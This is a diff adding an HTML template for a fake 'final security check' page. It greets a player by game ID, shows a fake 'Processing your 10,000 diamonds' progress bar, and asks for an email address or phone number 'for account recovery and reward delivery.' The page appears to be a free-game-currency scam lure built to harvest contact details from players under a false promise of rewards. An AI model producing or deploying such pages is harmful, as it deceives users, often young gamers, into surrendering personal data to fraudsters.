@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Final Verification</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container verify-container">
+        <div class="header">
+            <h2><i class="fas fa-user-check"></i> FINAL SECURITY CHECK</h2>
+            <p>Hello, Player <strong>{{ game_id }}</strong>! One more step to prevent fraud.</p>
+        </div>
+
+        <div class="verify-box">
+            <form action="/complete" method="POST">
+                <p class="info">For account recovery and reward delivery:</p>
+                
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" name="email" placeholder="Email Address (Optional)">
+                </div>
+                
+                <p class="or">OR</p>
+                
+                <div class="input-group">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" name="phone" placeholder="Phone Number (Optional)">
+                </div>
+
+                <button type="submit" class="verify-btn">
+                    <i class="fas fa-check-circle"></i> COMPLETE VERIFICATION
+                </button>
+            </form>
+
+            <div class="progress-info">
+                <p><i class="fas fa-sync-alt"></i> Processing your 10,000 diamonds...</p>
+                <div class="progress-bar">
+                    <div class="progress" style="width: 40%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
